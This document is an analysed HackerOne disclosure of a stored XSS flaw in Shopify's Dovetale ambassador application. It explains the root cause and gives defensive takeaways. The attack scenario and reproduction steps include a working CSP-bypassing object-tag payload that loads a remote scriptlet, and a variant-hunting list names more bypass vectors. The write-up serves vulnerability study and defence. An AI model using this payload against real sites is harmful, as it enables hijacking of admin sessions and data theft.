# Stored XSS in Dovetale Ambassador Application via Creator Personal Data

## Metadata
- **Source:** HackerOne
- **Report:** 1652046 | https://hackerone.com/reports/1652046
- **Submitted:** 2022-07-27
- **Reporter:** kun_19
- **Program:** Shopify (Dovetale)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding, Content Security Policy Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in Dovetale's ambassador application form where malicious JavaScript payloads injected into creator personal data fields (first name, last name, etc.) are stored and executed when admins review applications. The vulnerability bypasses the application's Content Security Policy through use of the object tag, affecting brand account administrators.

## Attack scenario
1. Attacker opens a victim brand's Dovetale ambassador application link provided publicly
2. Attacker completes the application form but injects XSS payload (<object type="text/x-scriptlet" data="https://xss.rocks/scriptlet.html"></object>) in the last name field
3. Attacker verifies email and submits application; payload is stored in the backend database
4. Victim (brand admin) receives the application and clicks Approve to review the applicant
5. Admin proceeds through application workflow: clicks 'Next Welcome package' then 'Next Review'
6. Stored XSS payload executes in admin's browser context, allowing JavaScript execution with admin privileges

## Root cause
Input validation and output encoding failures: (1) User-supplied data from application forms is not properly validated or sanitized before storage, (2) Data is not HTML-encoded when displayed in the admin review interface, (3) Content Security Policy does not restrict object tag with scriptlet data URIs, (4) The welcome email editor sanitizes but subsequent review screens do not apply the same protection

## Attacker mindset
An attacker recognizes that ambassador applications are submitted by untrusted external users but processed by high-value targets (brand administrators with account access). The attacker exploits the trust relationship between applicant data and admin review workflows. CSP bypass via object tag suggests reconnaissance of the specific security controls in place.

## Defensive takeaways
- Implement strict input validation on all user-submitted fields with whitelist of allowed characters; reject or escape special HTML/JavaScript characters at input
- Apply consistent HTML entity encoding to all user-controlled data at output, regardless of display context
- Enforce Content Security Policy that blocks object tags with data URIs, script-src 'none' or strict nonce-based approach
- Implement consistent output encoding across all UI flows (email editor, review pages, etc.) rather than selective sanitization
- Apply the same sanitization rules used in the email editor to all other display surfaces showing user-submitted data
- Use templating engines with auto-escaping enabled by default
- Implement automated security testing for stored XSS in user-submitted form fields across all workflows
- Consider using iframe sandboxing for display of user-generated content with restrictive sandbox attributes

## Variant hunting
Test other personal data fields (first name, company name, bio, social media handles) for similar XSS vulnerabilities
Attempt SVG-based XSS vectors with embedded scripts
Try data URIs with different MIME types to bypass CSP (data:text/html, data:image/svg+xml)
Test multipart form submissions and nested field structures for encoding bypasses
Examine other review workflows and email templates for inconsistent sanitization
Check if file upload fields (profile pictures, portfolios) have similar stored XSS risks
Test for DOM-based XSS in JavaScript that processes the stored data on client-side
Investigate if exported/downloaded application data maintains XSS payloads

## MITRE ATT&CK
- T1190
- T1566.002
- T1539
- T1598.003
- T1499.004

## Notes
The vulnerability requires legitimate external actor interaction (application submission) making it well-suited for supply-chain attacks. The CSP bypass via object tag is notable as it demonstrates the attacker's understanding of specific security implementations. The precondition of needing a real Shopify subscription (not dev stores) limits the attack surface but targets higher-value brand accounts. The workflow gap between sanitized email editor and unsanitized review screens suggests inconsistent security implementation across different UI components.

## Full report
<details><summary>Expand</summary>

## Summary:
Dovetale is an influencer platform from Shopify to manage and scale influencer marketing. The influencers can become an ambassador of the brand and  are able to apply for it. If a malicious creator applies with XSS payloads inside the  first name, last name, etc., the data  is stored and presented to the admins of the brand within the application area of Dovetale. The HTML-/JavaScript is finally triggered, when the admin is approving the application.

## Shops Used to Test:
19kun-24.myshopify.com

## Steps To Reproduce:

**Preconditions**: A "real" subscription for a Shopify plan (e.g. Basic Plan) is needed to get applications / manage  applicants. The creation of a development store is somehow not sufficient.

  1. (Victim) Install the Dovetale app for your store, create the Dovetale account and link it to your specific store.
  2. (Victim) Create an appropriate application page and copy the application link for becoming an ambassador (see F1841622)
  3. (Attacker) Open the link in a new browser instance and follow the application procedure. Apply for example with an existing Instagram account and...
  4. (Attacker) ...now it's time to fill out your personal data. Use for your last name the XSS payload `<object type="text/x-scriptlet" data="https://xss.rocks/scriptlet.html"></object>` according to the screenshot below:  
{F1841624}
  5. (Attacker) Finish and submit the application. Afterwards you have to verify the email address and then you're good.
  6. (Victim) You should now have received the application. Click on "Approve" ...  
{F1841627}
  7. (Victim) ...you are are now able to create the welcome email (see F1841629). The XSS payload doesn't trigger here because of the sanitization of the trip editor, but if you click "Next Welcome package" > "Next Review", the email is shown again and the JavaScript code is executed:  
{F1841634}

**Note:** The defined Content Security Policy of the page was successfully bypassed by using the `object` tag as this is not prevented by the policy.

## Impact

- Execution of JavaScript code in the victim's (e.g. Dovetale Account Owner) browser
- Exfiltration of confidential data. It's also possible to steal data of other applicants or data such as CSRF-Tokens etc. (I can also proof / show such an attack)
- Defacing of the site through HTML injection
- Phishing

</details>

---
*Analysed by Claude on 2026-05-12*
